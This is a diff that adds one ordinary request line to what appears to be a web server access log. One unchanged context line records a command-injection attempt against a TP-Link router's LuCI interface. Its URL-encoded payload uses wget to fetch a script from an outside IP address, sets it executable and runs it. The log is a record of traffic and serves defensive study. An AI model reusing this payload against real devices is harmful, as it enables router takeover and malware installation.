@@ -250,3 +250,4 @@
 45.79.172.21 - - [19/Apr/2024:17:32:31 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
 5.181.190.250 - - [19/Apr/2024:17:46:04 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1" 500 803 "-" "Go-http-client/1.1"
 143.110.222.166 - - [19/Apr/2024:18:02:50 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
+45.115.225.71 - - [25/Apr/2024:18:24:29 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.1"
